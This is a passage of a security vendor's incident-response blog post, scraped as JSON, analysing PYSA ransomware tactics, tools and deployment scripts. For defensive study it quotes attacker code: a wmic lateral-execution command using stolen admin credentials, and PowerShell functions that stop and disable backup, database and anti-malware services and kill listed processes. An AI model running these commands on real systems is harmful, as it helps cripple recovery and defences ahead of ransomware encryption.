{
    "id": "<report_0x98fcde58>",
    "url": "https://www.sentinelone.com/blog/from-the-front-lines-peering-into-a-pysa-ransomware-attack",
    "title": "From the Front Lines | Peering into A PYSA Ransomware Attack",
    "meta": [
        {
            "id": "<chapter_0x5a73efb1>",
            "title": "From the Front Lines | Peering into A PYSA Ransomware Attack",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xaded7a36>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x3cca60c8>": "https://www.sentinelone.com/blog/2022/04/"
                    },
                    "text": "April 18, 2022",
                    "html": "<a href=\"https://www.sentinelone.com/blog/2022/04/\" rel=\"bookmark\">\nApril 18, 2022\n</a>"
                },
                {
                    "id": "<sentence_0x97f46565>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "by",
                    "html": "\nby \n"
                },
                {
                    "id": "<sentence_0x9ee99490>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xf2f44fd4>": "https://www.sentinelone.com/blog/author/jamesh/"
                    },
                    "text": "James Haughom",
                    "html": "<a href=\"https://www.sentinelone.com/blog/author/jamesh/\">\nJames Haughom </a>"
                },
                {
                    "id": "<sentence_0x69c9123a>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x1606bddd>": "https://www.facebook.com/sharer.php?u=https://s1.ai/wPmRPm"
                    },
                    "text": "",
                    "html": "<a class=\"socicon socicon-facebook\" href=\"https://www.facebook.com/sharer.php?u=https://s1.ai/wPmRPm\" rel=\"noopener noreferrer\" target=\"_blank\"></a>"
                },
                {
                    "id": "<sentence_0x1454e00c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xb49d830>": "https://twitter.com/intent/tweet?url=https://s1.ai/wPmRPm&text=From%20the%20Front%20Lines%20%7C%20Peering%20into%20A%20PYSA%20Ransomware%20Attack"
                    },
                    "text": "",
                    "html": "<a class=\"socicon socicon-twitter\" href=\"https://twitter.com/intent/tweet?url=https://s1.ai/wPmRPm&amp;text=From%20the%20Front%20Lines%20%7C%20Peering%20into%20A%20PYSA%20Ransomware%20Attack\" rel=\"noopener noreferrer\" target=\"_blank\"></a>"
                },
                {
                    "id": "<sentence_0xb1ad8a6d>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x9df7f2d8>": "https://www.linkedin.com/shareArticle?mini=true&url=https://s1.ai/wPmRPm"
                    },
                    "text": "",
                    "html": "<a class=\"socicon socicon-linkedin\" href=\"https://www.linkedin.com/shareArticle?mini=true&amp;url=https://s1.ai/wPmRPm\" rel=\"noopener noreferrer\" target=\"_blank\"></a>"
                },
                {
                    "id": "<sentence_0xe6c54ef>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xdb3cb0df>": "https://reddit.com/submit?url=https://s1.ai/wPmRPm"
                    },
                    "text": "",
                    "html": "<a class=\"socicon socicon-reddit\" href=\"https://reddit.com/submit?url=https://s1.ai/wPmRPm\" rel=\"noopener noreferrer\" target=\"_blank\"></a>"
                },
                {
                    "id": "<sentence_0x286fe67a>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd9b3f514>": "mailto:?subject=From%20the%20Front%20Lines%20%7C%20Peering%20into%20A%20PYSA%20Ransomware%20Attack&body=https%3A%2F%2Fs1.ai%2FwPmRPm"
                    },
                    "text": "",
                    "html": "<a class=\"socicon socicon-mail\" href=\"mailto:?subject=From%20the%20Front%20Lines%20%7C%20Peering%20into%20A%20PYSA%20Ransomware%20Attack&amp;body=https%3A%2F%2Fs1.ai%2FwPmRPm\" rel=\"noopener noreferrer\"></a>"
                },
                {
                    "id": "<sentence_0x5b19975>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xde0bf8dc>": "sms:?body=From%20the%20Front%20Lines%20%7C%20Peering%20into%20A%20PYSA%20Ransomware%20Attack%20-%20https%3A%2F%2Fs1.ai%2FwPmRPm"
                    },
                    "text": "",
                    "html": "<a class=\"socicon socicon-sharethis\" href=\"sms:?body=From%20the%20Front%20Lines%20%7C%20Peering%20into%20A%20PYSA%20Ransomware%20Attack%20-%20https%3A%2F%2Fs1.ai%2FwPmRPm\" rel=\"noopener noreferrer\"></a>"
                }
            ]
        }
    ],
    "chapters": [
        {
            "id": "<chapter_0x822991ca>",
            "title": "From the Front Lines | Peering into A PYSA Ransomware Attack",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x49eaa806>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<table id=\"amazon-polly-audio-table\">\n<tbody><tr>\n<td id=\"amazon-polly-audio-tab\">\n</td>\n</tr>\n</tbody></table>"
                },
                {
                    "id": "<sentence_0x1ca0ff0c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "By James Haughom and Niranjan Jayanand",
                    "html": "<p>By James Haughom and Niranjan Jayanand</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xa05f86d>",
            "title": "Introduction",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xfb64748c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xcb6d8dea>": "https://www.sentinelone.com/lp/covid-19/",
                        "<a_0x1ba8d537>": "https://www.ic3.gov/Media/News/2021/210316.pdf"
                    },
                    "text": "PYSA (Protect Your System Amigo, aka Mespinoza) has been impacting high-value targets since early 2020, with a proclivity towards targeting educational and medical entities during the global pandemic. In March 2021, a FBI FLASH alert was issued concerning the noticeable increase in PYSA campaigns, particularly those against healthcare and educational targets.",
                    "html": "<p>PYSA (Protect Your System Amigo, aka Mespinoza) has been impacting high-value targets since early 2020, with a proclivity towards targeting educational and medical entities during the global <a href=\"https://www.sentinelone.com/lp/covid-19/\" rel=\"noopener noreferrer\" target=\"_blank\">pandemic</a>. In March 2021, a <a class=\"bf_ungated_init\" href=\"https://www.ic3.gov/Media/News/2021/210316.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">FBI FLASH alert</a> was issued concerning the noticeable increase in PYSA campaigns, particularly those against healthcare and educational targets.</p>"
                },
                {
                    "id": "<sentence_0x8337433b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "SentinelOnes DFIR engagement team encountered two particular PYSA ransomware campaigns that displayed some interesting tactics that may be of interest to security teams and analysts. In this post, we give a brief overview of PYSA and document the tactics we observed.",
                    "html": "<p>SentinelOne\u2019s DFIR engagement team encountered two particular PYSA ransomware campaigns that displayed some interesting tactics that may be of interest to security teams and analysts. In this post, we give a brief overview of PYSA and document the tactics we observed.</p>"
                },
                {
                    "id": "<sentence_0x2077bf96>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x89180f97>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/From-the-Front-Lines-Peering-into-A-PYSA-Ransomware-Attack-By-James-Haughom-and-Niranjan-Jayanand-4.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "",
                    "html": "<p><img alt=\"\" class=\"aligncenter size-full wp-image-65798\" height=\"628\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/From-the-Front-Lines-Peering-into-A-PYSA-Ransomware-Attack-By-James-Haughom-and-Niranjan-Jayanand-4.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1200\"/></p>"
                }
            ]
        },
        {
            "id": "<chapter_0x6d1f057>",
            "title": "Overview",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x40501993>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "PYSAs tactics are similar to other ransomware contemporaries. The group embraces the multipronged extortion model, hosting a long-standing blog of victim names and data, although as of early April 2022, the PYSA victim blog has been offline.",
                    "html": "<p>PYSA\u2019s tactics are similar to other ransomware contemporaries. The group embraces the multipronged extortion model, hosting a long-standing blog of victim names and data, although as of early April 2022, the PYSA victim blog has been offline.</p>"
                },
                {
                    "id": "<sentence_0xb51b1235>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60cbe453>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/pysa-blog.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Screenshot of PYSA blog",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65777\"><img alt=\"\" class=\"size-full wp-image-65777\" height=\"831\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/pysa-blog.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"986\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65777\">Screenshot of PYSA blog</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x96dcf435>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Once a target has been breached, the attackers discover and exfiltrate sensitive and critical data, encrypt victim files, and demand a ransom.",
                    "html": "<p>Once a target has been breached, the attackers discover and exfiltrate sensitive and critical data, encrypt victim files, and demand a ransom.</p>"
                },
                {
                    "id": "<sentence_0x62e40bce>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "PYSAs primary methods of initial access and delivery have centered around RDP (Remote Desktop Protocol) exploits as well as phishing emails. Even with phishing as a first stage, the goal is to extract RDP credentials to make entry via their preferred method.",
                    "html": "<p>PYSA\u2019s primary methods of initial access and delivery have centered around RDP (Remote Desktop Protocol) exploits as well as phishing emails. Even with phishing as a first stage, the goal is to extract RDP credentials to make entry via their preferred method.</p>"
                },
                {
                    "id": "<sentence_0x3fd2dec3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x87c28055>": "https://www.sentinelone.com/blog/how-do-attackers-use-lolbins-in-fileless-attacks/",
                        "<a_0x4617dc07>": "https://github.com/winscp/winscp",
                        "<a_0x55b24048>": "https://www.advanced-ip-scanner.com/",
                        "<a_0x840f69ed>": "https://www.advanced-port-scanner.com/",
                        "<code_0xc68d7ec0>": "mega.nz"
                    },
                    "text": "The group relies heavily on LOLBINs and COTS tools, avoiding the use of malware other than for encryption. Tools such as Cobalt Strike, Empire, WinSCP, Advanced IP Scanner and Advanced Port Scanner (and their forks) are often observed in active PYSA engagements. The group has also adopted additional tools like Chisel. Cloud storage services (e.g., mega.nz) are often utilized for data exfiltration, detection of which is many victims first indication of infection.",
                    "html": "<p>The group relies heavily on <a href=\"https://www.sentinelone.com/blog/how-do-attackers-use-lolbins-in-fileless-attacks/\" rel=\"noopener noreferrer\" target=\"_blank\">LOLBINs</a> and COTS tools, avoiding the use of malware other than for encryption. Tools such as Cobalt Strike, Empire, <a href=\"https://github.com/winscp/winscp\" rel=\"noopener noreferrer\" target=\"_blank\">WinSCP</a>, <a href=\"https://www.advanced-ip-scanner.com/\" rel=\"noopener noreferrer\" target=\"_blank\">Advanced IP Scanner</a> and <a href=\"https://www.advanced-port-scanner.com/\" rel=\"noopener noreferrer\" target=\"_blank\">Advanced Port Scanner</a> (and their forks) are often observed in active PYSA engagements. The group has also adopted additional tools like Chisel. Cloud storage services (e.g., <code>mega.nz</code>) are often utilized for data exfiltration, detection of which is many victims\u2019 first indication of infection.</p>"
                },
                {
                    "id": "<sentence_0xc438a668>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Over the last two years, PYSA has successfully compromised an increasing number of organizations. PYSA targets a number of sectors aside from healthcare and education, including Government, Food & Agriculture, Real Estate, Engineering, Utilities and others.",
                    "html": "<p>Over the last two years, PYSA has successfully compromised an increasing number of organizations. PYSA targets a number of sectors aside from healthcare and education, including Government, Food &amp; Agriculture, Real Estate, Engineering, Utilities and others.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x624374c0>",
            "title": "Technical Details",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x8c37b04d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xf2131b53>": "https://www.sentinelone.com/cybersecurity-101/windows-powershell/",
                        "<code_0x88d528c8>": "psexec.exe",
                        "<code_0x662398a6>": "\u201c\\\\$<hostname>\\share$\\p.ps1\u201d"
                    },
                    "text": "The ransomware observed by our team was deployed via a batch script which then called psexec.exe to start a Windows PowerShell script located at \\\\$<hostname>\\share$\\p.ps1.",
                    "html": "<p>The ransomware observed by our team was deployed via a batch script which then called <code>psexec.exe</code> to start a <a href=\"https://www.sentinelone.com/cybersecurity-101/windows-powershell/\" rel=\"noopener\" target=\"_blank\">Windows PowerShell</a> script located at <code>\u201c\\\\$&lt;hostname&gt;\\share$\\p.ps1\u201d</code>.</p>"
                },
                {
                    "id": "<sentence_0x34731e91>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9a90e63e>": "psexec0.bat",
                        "<code_0x4fe7fa0a>": "psexec1.bat",
                        "<code_0xc5550c>": "wmi0.bat",
                        "<code_0xf0faac20>": "wmi1.bat"
                    },
                    "text": "There were multiple batch scripts in the target directory for multiple deployment methods, e.g., psexec0.bat, psexec1.bat, wmi0.bat, wmi1.bat.",
                    "html": "<p>There were multiple batch scripts in the target directory for multiple deployment methods, e.g., <code>psexec0.bat</code>, <code>psexec1.bat</code>, <code>wmi0.bat</code>, <code>wmi1.bat</code>.</p>"
                },
                {
                    "id": "<sentence_0x189429f9>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xb64ddf41>": "*0.bat",
                        "<code_0xc1fcf2f7>": "*1.bat",
                        "<code_0x4c48cedb>": "services.exe",
                        "<code_0xb5d2f81c>": "*2.bat",
                        "<code_0xf5006219>": "services.exe"
                    },
                    "text": "The *0.bat variant calls the PowerShell-based ransomware directly from the network share; the *1.bat variant is designed to copy a services.exe file from that directory to the system Temp directory, and *2.bat file calls that executable on the victim machine. The latter two files are a backup plan in case the initial PowerShell ransomware is unsuccessful; however, due to the lack of the services.exe file existing in the environment, it appears this went unused.",
                    "html": "<p>The <code>*0.bat</code> variant calls the PowerShell-based ransomware directly from the network share; the <code>*1.bat</code> variant is designed to copy a <code>services.exe</code> file from that directory to the system Temp directory, and <code>*2.bat</code> file calls that executable on the victim machine. The latter two files are a backup plan in case the initial PowerShell ransomware is unsuccessful; however, due to the lack of the <code>services.exe</code> file existing in the environment, it appears this went unused.</p>"
                },
                {
                    "id": "<sentence_0x53b39511>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x226d825a>": "https://www.sentinelone.com/blog/7-ways-hackers-steal-your-passwords/"
                    },
                    "text": "Attackers were seen password spraying to gain RDP access to both virtual machines and workstations. They also targeted domain controllers and exchange servers heavily, planning to maximize business disruption.",
                    "html": "<p>Attackers were seen <a href=\"https://www.sentinelone.com/blog/7-ways-hackers-steal-your-passwords/\" rel=\"noopener\" target=\"_blank\">password spraying</a> to gain RDP access to both virtual machines and workstations. They also targeted domain controllers and exchange servers heavily, planning to maximize business disruption.</p>"
                },
                {
                    "id": "<sentence_0xa498a39e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa80fa6a0>": "psexec",
                        "<code_0xd6a40481>": ".pysa"
                    },
                    "text": "During our investigation of the attack stages, we also identified the attacker using psexec for lateral movement and the final ransomware payload encrypted and renamed files with either a .pysa extension or another four character extension.",
                    "html": "<p>During our investigation of the attack stages, we also identified the attacker using <code>psexec</code> for lateral movement and the final ransomware payload encrypted and renamed files with either a <code>.pysa</code> extension or another four character extension.</p>"
                },
                {
                    "id": "<sentence_0xda314dc0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The table below summarizes the different tools and techniques used by the PYSA ransomware group at different stages of the kill chain.",
                    "html": "<p>The table below summarizes the different tools and techniques used by the PYSA ransomware group at different stages of the kill chain.</p>"
                },
                {
                    "id": "<sentence_0xc2e349f6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0x3ca65aa4>": {
                            "0": {
                                "0": "TECHNIQUES",
                                "1": "Evasion",
                                "2": "Cred Access",
                                "3": "Discovery",
                                "4": "Persistence",
                                "5": "Lat Movement",
                                "6": "Backdoor",
                                "7": "Exfiltration"
                            },
                            "1": {
                                "0": "TOOLS",
                                "1": "PowerShell",
                                "2": "PowerShell",
                                "3": "IP Scanner",
                                "4": "Chisel",
                                "5": "PsExec",
                                "6": "Chisel",
                                "7": "MEGASync"
                            },
                            "2": {
                                "0": "",
                                "1": "Batch",
                                "2": "Empire",
                                "3": "Port Scanner",
                                "4": "Cobalt Strike",
                                "5": "RDP",
                                "6": "",
                                "7": "WindSCP"
                            },
                            "3": {
                                "0": "",
                                "1": "",
                                "2": "Koadic",
                                "3": "PowerShell",
                                "4": "",
                                "5": "Batch Script",
                                "6": "",
                                "7": ""
                            },
                            "4": {
                                "0": "",
                                "1": "",
                                "2": "Mimikatz",
                                "3": "",
                                "4": "",
                                "5": "",
                                "6": "",
                                "7": ""
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>TECHNIQUES</td>\n<td>TOOLS</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Evasion</td>\n<td> PowerShell </td>\n<td>Batch</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Cred Access</td>\n<td> PowerShell </td>\n<td>Empire</td>\n<td>Koadic</td>\n<td>Mimikatz</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td> IP Scanner</td>\n<td>Port Scanner</td>\n<td>PowerShell</td>\n<td></td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td> Chisel</td>\n<td>Cobalt Strike</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Lat Movement</td>\n<td> PsExec</td>\n<td>RDP</td>\n<td>Batch Script</td>\n<td></td>\n</tr>\n<tr>\n<td>Backdoor</td>\n<td> Chisel</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Exfiltration</td>\n<td> MEGASync</td>\n<td>WindSCP</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0xc27414d1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Below are some script files identified on multiple endpoints that attackers used for their lateral movement.",
                    "html": "<p>Below are some script files identified on multiple endpoints that attackers used for their lateral movement.</p>"
                },
                {
                    "id": "<sentence_0x1e212781>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xa2f25dbc>": {
                            "0": {
                                "0": "File Name",
                                "1": "Before",
                                "2": "p",
                                "3": "psexec0",
                                "4": "psexec1",
                                "5": "psexec2",
                                "6": "wmi2",
                                "7": "wmi2(1)"
                            },
                            "1": {
                                "0": "Type",
                                "1": "Windows BatchFile",
                                "2": "Windows Powershell script",
                                "3": "Windows BatchFile",
                                "4": "Windows BatchFile",
                                "5": "Windows BatchFile",
                                "6": "Windows BatchFile",
                                "7": "Windows BatchFile"
                            },
                            "2": {
                                "0": "File Size",
                                "1": "1 KB",
                                "2": "5 KB",
                                "3": "810 KB",
                                "4": "736 KB",
                                "5": "585 KB",
                                "6": "636 KB",
                                "7": "636 KB"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>File Name</td>\n<td>Type</td>\n<td>File Size</td>\n</tr>\n<tr>\n<td>Before</td>\n<td>Windows BatchFile</td>\n<td>1 KB</td>\n</tr>\n<tr>\n<td>p</td>\n<td>Windows Powershell script</td>\n<td>5 KB</td>\n</tr>\n<tr>\n<td>psexec0</td>\n<td>Windows BatchFile</td>\n<td>810 KB</td>\n</tr>\n<tr>\n<td>psexec1</td>\n<td>Windows BatchFile</td>\n<td>736 KB</td>\n</tr>\n<tr>\n<td>psexec2</td>\n<td>Windows BatchFile</td>\n<td>585 KB</td>\n</tr>\n<tr>\n<td>wmi2</td>\n<td>Windows BatchFile</td>\n<td>636 KB</td>\n</tr>\n<tr>\n<td>wmi2(1)</td>\n<td>Windows BatchFile</td>\n<td>636 KB</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x41deb95d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x4f45faef>": "svchost.exe"
                    },
                    "text": "wmi2 and wmi2 (1) uses stolen Domain Administrator credentials to deploy the ransomware en masse across the environment. In our example, the filename used for the deployed payloads was svchost.exe.",
                    "html": "<p>wmi2 and wmi2 (1) \u2013 uses stolen Domain Administrator credentials to deploy the ransomware en masse across the environment. In our example, the filename used for the deployed payloads was <code>svchost.exe</code>.</p>"
                },
                {
                    "id": "<sentence_0xed8bc928>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd97044ce>": "wmi*.bat",
                        "<code_0xacc85bc1>": "svchost.exe"
                    },
                    "text": "The two wmi*.bat files dropped by the attacker have numerous lines (like the one below) to laterally move and execute an executable by the name svchost.exe from the Temp folder into many different endpoints.",
                    "html": "<p>The two <code>wmi*.bat</code> files dropped by the attacker have numerous lines (like the one below) to laterally move and execute an executable by the name <code>svchost.exe</code> from the Temp folder into many different endpoints.</p>"
                },
                {
                    "id": "<sentence_0x5056d66b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "wmic /node:\"<REDACTED>\" /user:\"<<REDACTED>>\" /password:\"<<REDACTED>>process call create \"cmd /c c:\\windows\\temp\\svchost.exe\"",
                    "html": "\nwmic /node:\"<REDACTED>\" /user:\"<<REDACTED>>\" /password:\"<<REDACTED>>process call create \"cmd /c c:\\windows\\temp\\svchost.exe\"\n"
                },
                {
                    "id": "<sentence_0x553c0782>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This executable is a Chisel Tunneling tool programmed in Go. Pysa threat actors have been consistent with using Chisel for tunneling, and the same file name and folder path occur in their earlier attacks as well.",
                    "html": "<p>This executable is a Chisel Tunneling tool programmed in Go. Pysa threat actors have been consistent with using Chisel for tunneling, and the same file name and folder path occur in their earlier attacks as well.</p>"
                },
                {
                    "id": "<sentence_0xf97d721f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The scripts above were used for various system information discovery tasks, as well as establishing the Cobalt Strike beacon, and ultimately the PowerShell-based execution of the ransomware itself.",
                    "html": "<p>The scripts above were used for various system information discovery tasks, as well as establishing the Cobalt Strike beacon, and ultimately the PowerShell-based execution of the ransomware itself.</p>"
                },
                {
                    "id": "<sentence_0x18246270>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xbd89b07d>": "p.ps1"
                    },
                    "text": "The p.ps1 script above is used to kill or terminate services which may interfere with the encryption process. It also attempts to identify specific anti-virus applications.",
                    "html": "<p>The <code>p.ps1</code> script above is used to kill or terminate services which may interfere with the encryption process. It also attempts to identify specific anti-virus applications.</p>"
                },
                {
                    "id": "<sentence_0x338d1e97>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9d7f2b70>": "s()"
                    },
                    "text": "The s() function will kill services by name, which is passed as an argument to the function. This is typical pre-ransomware deployment behavior to ensure that handles to critical assets (files/DBs) are forcibly closed, allowing the ransomware to obtain a handle and encrypt them.",
                    "html": "<p>The <code>s()</code> function will kill services by name, which is passed as an argument to the function. This is typical pre-ransomware deployment behavior to ensure that handles to critical assets (files/DBs) are forcibly closed, allowing the ransomware to obtain a handle and encrypt them.</p>"
                },
                {
                    "id": "<sentence_0x356a6dda>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "function s($s) {<crlf>Get-Service | Where-Object {$_.DisplayName -like \"*$s*\"} | Stop-Service -Force<crlf>Get-Service | Where-Object {$_.DisplayName -like \"*$s*\"} | Set-Service -StartupType Disabled<crlf>}",
                    "html": "\nfunction s($s) {\nGet-Service | Where-Object {$_.DisplayName -like \"*$s*\"} | Stop-Service -Force\nGet-Service | Where-Object {$_.DisplayName -like \"*$s*\"} | Set-Service -StartupType Disabled\n}\n"
                },
                {
                    "id": "<sentence_0x190e904e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Services terminated:",
                    "html": "<p>Services terminated:</p>"
                },
                {
                    "id": "<sentence_0x20d42476>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xd6d123ca>": {
                            "0": {
                                "0": "SQL",
                                "1": "Exchange",
                                "2": "Sharepoint"
                            },
                            "1": {
                                "0": "Oracle",
                                "1": "Veeam",
                                "2": "Quest"
                            },
                            "2": {
                                "0": "Citrix",
                                "1": "Malwarebytes",
                                "2": "Backup"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>SQL</td>\n<td>Oracle</td>\n<td>Citrix</td>\n</tr>\n<tr>\n<td>Exchange</td>\n<td>Veeam</td>\n<td>Malwarebytes</td>\n</tr>\n<tr>\n<td>Sharepoint</td>\n<td>Quest</td>\n<td>Backup</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0xf7b8e322>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa240ba1e>": "p()"
                    },
                    "text": "The function p() is used to terminate processes by name using the WMIC utility. The name of the process to be terminated is passed as an argument to the function. The following processes are killed by the malware.",
                    "html": "<p>The function <code>p()</code> is used to terminate processes by name using the WMIC utility. The name of the process to be terminated is passed as an argument to the function. The following processes are killed by the malware.</p>"
                },
                {
                    "id": "<sentence_0xc52855df>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xd0abbbf7>": {
                            "0": {
                                "0": "acronis",
                                "1": "anydesk",
                                "2": "barracuda",
                                "3": "Core.Service",
                                "4": "Endpoint",
                                "5": "http",
                                "6": "microsoft",
                                "7": "protect",
                                "8": "sage",
                                "9": "silverlight",
                                "10": "teamviewer"
                            },
                            "1": {
                                "0": "adobe",
                                "1": "apache",
                                "2": "center",
                                "3": "database",
                                "4": "engine",
                                "5": "java",
                                "6": "Mongo",
                                "7": "QBCF",
                                "8": "secure",
                                "9": "solarwinds",
                                "10": "veeam"
                            },
                            "2": {
                                "0": "agent",
                                "1": "Arcserve",
                                "2": "chrome",
                                "3": "def",
                                "4": "exchange",
                                "5": "logmein",
                                "6": "monitor",
                                "7": "QBData",
                                "8": "security",
                                "9": "sprout",
                                "10": "Veeam"
                            },
                            "3": {
                                "0": "Agent",
                                "1": "autodesk",
                                "2": "citrix",
                                "3": "dev",
                                "4": "firefox",
                                "5": "Malware",
                                "6": "OCS Inventory",
                                "7": "QBDB",
                                "8": "segurda",
                                "9": "sql",
                                "10": "vnc"
                            },
                            "4": {
                                "0": "AlwaysOn",
                                "1": "Backup",
                                "2": "Citrix",
                                "3": "endpoint",
                                "4": "Framework",
                                "5": "manage",
                                "6": "office",
                                "7": "QuickBooks",
                                "8": "server",
                                "9": "SQL",
                                "10": "web"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>acronis</td>\n<td>adobe</td>\n<td>agent</td>\n<td>Agent</td>\n<td>AlwaysOn</td>\n</tr>\n<tr>\n<td>anydesk</td>\n<td>apache</td>\n<td>Arcserve</td>\n<td>autodesk</td>\n<td>Backup</td>\n</tr>\n<tr>\n<td>barracuda</td>\n<td>center</td>\n<td>chrome</td>\n<td>citrix</td>\n<td>Citrix</td>\n</tr>\n<tr>\n<td>Core.Service</td>\n<td>database</td>\n<td>def</td>\n<td>dev</td>\n<td>endpoint</td>\n</tr>\n<tr>\n<td>Endpoint</td>\n<td>engine</td>\n<td>exchange</td>\n<td>firefox</td>\n<td>Framework</td>\n</tr>\n<tr>\n<td>http</td>\n<td>java</td>\n<td>logmein</td>\n<td>Malware</td>\n<td>manage</td>\n</tr>\n<tr>\n<td>microsoft</td>\n<td>Mongo</td>\n<td>monitor</td>\n<td>OCS Inventory</td>\n<td>office</td>\n</tr>\n<tr>\n<td>protect</td>\n<td>QBCF</td>\n<td>QBData</td>\n<td>QBDB</td>\n<td>QuickBooks</td>\n</tr>\n<tr>\n<td>sage</td>\n<td>secure</td>\n<td>security</td>\n<td>segurda</td>\n<td>server</td>\n</tr>\n<tr>\n<td>silverlight</td>\n<td>solarwinds</td>\n<td>sprout</td>\n<td>sql</td>\n<td>SQL</td>\n</tr>\n<tr>\n<td>teamviewer</td>\n<td>veeam</td>\n<td>Veeam</td>\n<td>vnc</td>\n<td>web</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x443a7fb1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "function p($p) {<crlf>wmic process where \"name like '%$p%'\" delete<crlf>}",
                    "html": "\nfunction p($p) {\n wmic process where \"name like '%$p%'\" delete\n}\n"
                },
                {
                    "id": "<sentence_0xbd104a49>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x5f3acec4>": "C:\\log\\<computer name>.txt"
                    },
                    "text": "The script also tags affected systems with a text file, writing the content Ill be back. This text file is written to C:\\log\\<computer name>.txt.",
                    "html": "<p>The script also tags affected systems with a text file, writing the content \u201cI\u2019ll be back\u201d. This text file is written to <code>C:\\log\\&lt;computer name&gt;.txt</code>.</p>"
                },
                {
                    "id": "<sentence_0xa80583ac>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "New-Item -Path \"\\\\<<computer name>>\\log$\" -Name \"$name.txt\" -ItemType \"file\" -Value \"I'll be back.\";",
                    "html": "\nNew-Item -Path \"\\\\<<computer name>>\\log$\" -Name \"$name.txt\" -ItemType \"file\" -Value \"I'll be back.\";\n"
                },
                {
                    "id": "<sentence_0x33549c30>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
